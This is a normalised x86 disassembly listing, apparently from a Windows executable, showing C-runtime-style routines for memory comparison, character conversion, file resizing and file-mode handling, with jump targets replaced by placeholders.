movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x8 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x6 ]
movzx eax [ edx + 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1 ]
movzx eax [ edx - 0x1 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx edi [ esi + 0x9 ]
movzx eax [ edx + 0x9 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x7 ]
movzx eax [ edx + 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0xc ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xa ]
movzx eax [ edx + 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx edi [ esi + 0xd ]
movzx eax [ edx + 0xd ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xb ]
movzx eax [ edx + 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx eax [ edx + 0x10 ]
movzx edi [ esi + 0x10 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xe ]
movzx eax [ edx + 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx edi [ esi + 0x11 ]
movzx eax [ edx + 0x11 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xf ]
movzx eax [ edx + 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x14 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x12 ]
movzx eax [ edx + 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx edi [ esi + 0x15 ]
movzx eax [ edx + 0x15 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x13 ]
movzx eax [ edx + 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x18 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x16 ]
movzx eax [ edx + 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx edi [ esi + 0x19 ]
movzx eax [ edx + 0x19 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x17 ]
movzx eax [ edx + 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x1c ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x1a ]
movzx eax [ edx + 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop ecx
sub ebx ecx
add esi ecx
add edx ecx
cmp ebx ecx
jae r-xdata
movzx edi [ esi + 0x1d ]
movzx eax [ edx + 0x1d ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x1b ]
movzx eax [ edx + 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi + 0x1e ]
movzx eax [ edx + 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi + 0x1f ]
movzx eax [ edx + 0x1f ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
sub_41c7db
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_40f858
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_411550
push 0x16
pop esi
mov [ eax ] esi
call sub_411714
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp + 0xc ]
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
mov [ ebp + 0xc ] esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_411550
mov [ eax ] 0x2a
call sub_411550
mov esi [ eax ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_411550
push 0x22
pop esi
mov [ eax ] esi
call sub_411714
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_414160
add esp 0xc
push edi
push esi
push ebx
call sub_414160
add esp 0xc
sub_41c918
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_412f82
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_411550
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_411550
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_412991
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push edi
mov [ ebp + 0xc ] 0x2
call sub_4141f0
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x2 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
sub eax 0x2
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_418172
pop ecx
test eax eax
jne r-xdata
call sub_412991
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax cx
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_4141f0
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_4181c6
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_41313d
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_41ca78
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x1
push esi
push esi
push edi
mov ebx esi
mov [ ebp - 0x8 ] esi
call sub_413239
mov ecx edx
mov [ ebp - 0x18 ] eax
and eax ecx
add esp 0x10
mov [ ebp - 0x14 ] ecx
cmp eax 0xffffffff
je r-xdata
call sub_411550
mov eax [ eax ]
push 0x2
push esi
push esi
push edi
call sub_413239
mov ecx eax
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
sub esi ecx
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
test eax eax
jg r-xdata
jg r-xdata
push 0x0
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push edi
call sub_413239
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
push 0x1000
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_413239
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test esi esi
jae r-xdata
push 0x8000
push edi
call sub_41cc56
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_411550
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push edi
call sub_41a30e
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov ebx eax
mov eax edx
mov ecx ebx
and ecx eax
mov [ ebp - 0x8 ] eax
cmp ecx 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_411550
mov [ eax ] 0xd
call sub_41151c
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
call sub_41151c
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
mov eax [ ebp - 0x4 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
mov eax 0x1000
jmp r-xdata
cmp esi 0x1000
jb r-xdata
or ebx 0xffffffff
or [ ebp - 0x8 ] ebx
call sub_411550
mov [ eax ] 0xd
push [ ebp - 0x10 ]
push edi
call sub_41cc56
pop ecx
pop ecx
push [ ebp - 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
jg r-xdata
push eax
push [ ebp - 0xc ]
push edi
call sub_4142d2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and ebx [ ebp - 0x8 ]
cmp ebx 0xffffffff
je r-xdata
test eax eax
jl r-xdata
test esi esi
je r-xdata
jmp r-xdata
sub_41cc2c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
call sub_411550
mov [ eax ] 0x16
call sub_411714
push 0x16
pop eax
pop ebp
retn
sub_41cc56
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx esi
sar ebx 0x5
and esi 0x1f
shl esi 0x6
push edi
mov edi [ ebx * 4 + rw-data ]
mov cl [ edi + esi + 0x4 ]
movzx eax cl
and eax 0x80
mov [ ebp + 0x8 ] eax
mov al [ edi + esi + 0x24 ]
add al al
movsx edx al
mov eax [ ebp + 0xc ]
sar edx 0x1
cmp eax 0x4000
je r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov eax [ ebx * 4 + rw-data ]
and [ eax + esi + 0x24 ] 0x80
cmp eax 0x8000
je r-xdata
neg edx
sbb edx edx
and edx 0xc000
lea eax [ edx + 0x4000 ]
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and cl 0x7f
mov [ edi + esi + 0x4 ] cl
jmp r-xdata
cmp eax 0x10000
je r-xdata
cmp [ ebp + 0x8 ] 0x0
pop edi
pop esi
pop ebx
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x82
or al 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov [ ecx + esi + 0x24 ] al
jmp r-xdata
cmp eax 0x40000
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x81
or al 0x1
sub_41cd60
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
cmove ebx eax
inc edx
sub ebx 0x1
jbe r-xdata
sub ebx 0x4
jbe r-xdata
test dl 0x3
jne r-xdata
lea esi [ eax - 0x1010101 ]
